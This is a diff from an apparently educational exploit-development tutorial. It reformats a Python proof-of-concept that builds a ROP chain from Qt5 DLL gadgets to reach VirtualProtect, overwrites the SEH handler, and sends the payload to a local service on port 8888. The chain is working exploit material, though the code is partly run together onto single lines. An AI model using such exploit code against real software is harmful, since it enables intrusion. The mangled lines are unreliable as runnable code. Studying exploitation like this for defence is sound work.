@@ -972,9 +972,19 @@ Now lets explain what we see above. At the first gadget we put the hex value **0
 
 In order to see this in practice lets create the following PoC script
 
-```
-import struct import socket
-import sys target = "127.0.0.1" payload\_size = 1604 junk1 = "\x41" \* payload\_size ######################################################################## # Get kernel32 address from the stack # 762a20d8 kernel32!VirtualProtect rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll] rop+= struct.pack('L',0x0385FF88) # Offset rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x0362fffc) # Offset rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll] ######################################################################## buf = "\x42" \* 351 nops = "\x90" \* 16 junk2 = "\x43"\*(2236 - len(rop) - len(nops) - len(buf) - len(junk1)) seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN payload = junk1 + rop + nops + buf + junk2 + seh try: s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) s.connect((target,8888)) s.send(payload) except Exception as e: print(sys.exc\_value)
+```python
+import struct 
+import socket
+import sys 
+
+target = "127.0.0.1" 
+payload_size = 1604 junk1 = "\x41" * payload_size
+
+######################################################################## 
+# Get kernel32 address from the stack 
+# 762a20d8 kernel32!VirtualProtect 
+
+rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll] rop+= struct.pack('L',0x0385FF88) # Offset rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x0362fffc) # Offset rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll] ######################################################################## buf = "\x42" \* 351 nops = "\x90" \* 16 junk2 = "\x43"\*(2236 - len(rop) - len(nops) - len(buf) - len(junk1)) seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN payload = junk1 + rop + nops + buf + junk2 + seh try: s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) s.connect((target,8888)) s.send(payload) except Exception as e: print(sys.exc\_value)
 ```
 
 Below is the debugging session with **WinDBG** which shows the ROP gadgets in action:
